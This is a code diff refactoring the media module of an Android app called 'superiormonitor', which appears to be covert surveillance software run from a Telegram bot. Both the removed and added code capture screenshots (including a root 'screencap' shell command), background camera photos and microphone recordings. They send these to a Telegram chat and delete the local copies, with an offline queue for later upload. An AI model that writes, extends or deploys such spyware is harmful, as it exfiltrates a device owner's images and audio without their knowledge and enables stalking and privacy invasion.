@@ -1,13 +1,13 @@
 package com.system.superiormonitor.monitor
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.content.Context
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import com.system.superiormonitor.bot.TelegramApi
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import android.app.KeyguardManager
 import android.media.AudioAttributes
 import android.media.AudioFocusRequest
@@ -70,13 +70,12 @@ object MediaOperations {
             var errorOutput = ""
             
             try {
-                if (type == 0) {
-                    val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
-                    val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-                    val isLocked = keyguardManager.isKeyguardLocked
-                    val isScreenOn = powerManager.isInteractive
-
-                    if (isLocked || !isScreenOn) {
+                val (success, errOut) = com.system.superiormonitor.core.CaptureHelper.performCapture(context, type, false, tempFile)
+                if (!success) {
+                    isSuccess = false
+                    errorOutput = errOut
+                    
+                    if (errOut.contains("skipped/aborted")) {
                         LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture aborted: Screen is locked or off.")
                         TelegramApi.editMessageText(
                             botToken, chatId, messageId,
@@ -84,16 +83,6 @@ object MediaOperations {
                             replyMarkup = com.system.superiormonitor.bot.BotMarkups.Alerts.buildLockedScreenMarkup()
                         )
                         return@launch
-                    }
-
-                    val result = com.topjohnwu.superuser.Shell.cmd("screencap -p ${tempFile.absolutePath} && chmod 666 ${tempFile.absolutePath}").exec()
-                    errorOutput = result.err.joinToString("\n")
-                    if (!result.isSuccess) isSuccess = false
-                } else {
-                    val success = BackgroundCamera.capture(context, type, tempFile)
-                    if (!success) {
-                        isSuccess = false
-                        errorOutput = "capture failed internally."
                     }
                 }
                 
@@ -126,8 +115,15 @@ object MediaOperations {
                 val caption = com.system.superiormonitor.bot.BotMessages.MediaOps.buildOnDemandCaptureMessage(type)
                 
                 // Upload photo
-                val uploaded = TelegramApi.sendPhoto(botToken, chatId, destFile, caption)
-                destFile.delete()
+                val uploaded = com.system.superiormonitor.bot.MediaUploader.uploadPhoto(
+                    context = context,
+                    token = botToken,
+                    chatId = chatId,
+                    file = destFile,
+                    caption = caption,
+                    fallbackOfflineSubdir = null
+                )
+                if (!uploaded) destFile.delete() // Cleanup if failed without offline fallback
                 
                 if (uploaded) {
                     LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture successfully uploaded.")
@@ -422,28 +418,26 @@ object MediaOperations {
                     return@launch
                 }
 
-                if (TelegramApi.isApiReachable(context, botToken)) {
-                    val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = "Microphone Recording")
-                    if (uploaded) {
-                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Successfully uploaded recording.")
-                        outputFile.delete()
-                        TelegramApi.editMessageText(
-                            botToken, chatId, messageId,
-                            "✅ *Recording Successfully Uploaded*\n\nThe recording has been completed. The file was deleted from device and sent to Telegram."
-                        )
-                    } else {
-                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Telegram upload failed. Moving to offline queue.", LogLevel.ERROR)
-                        com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "mediaops", fileName)
-                        TelegramApi.editMessageText(
-                            botToken, chatId, messageId,
-                            "❌ *Audio Recording Failed*\n\nReason: Telegram API Upload Failed. File queued for offline sync."
-                        )
-                    }
+                val uploaded = com.system.superiormonitor.bot.MediaUploader.uploadDocument(
+                    context = context,
+                    token = botToken,
+                    chatId = chatId,
+                    file = outputFile,
+                    mimeType = "audio/*",
+                    caption = "Microphone Recording",
+                    fallbackOfflineSubdir = "mediaops"
+                )
+                
+                if (uploaded) {
+                    TelegramApi.editMessageText(
+                        botToken, chatId, messageId,
+                        "✅ *Recording Successfully Uploaded*\n\nThe recording has been completed. The file was deleted from device and sent to Telegram."
+                    )
                 } else {
-                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Device offline. Moved recording to offline queue.")
-                    com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "mediaops", fileName)
-
-                    // Dropping the editMessageText because the device is offline and it will fail anyway.
+                    TelegramApi.editMessageText(
+                        botToken, chatId, messageId,
+                        "❌ *Audio Recording Failed*\n\nReason: Network unreachable or API error. File queued for offline sync."
+                    )
                 }
 
             } catch (e: Exception) {
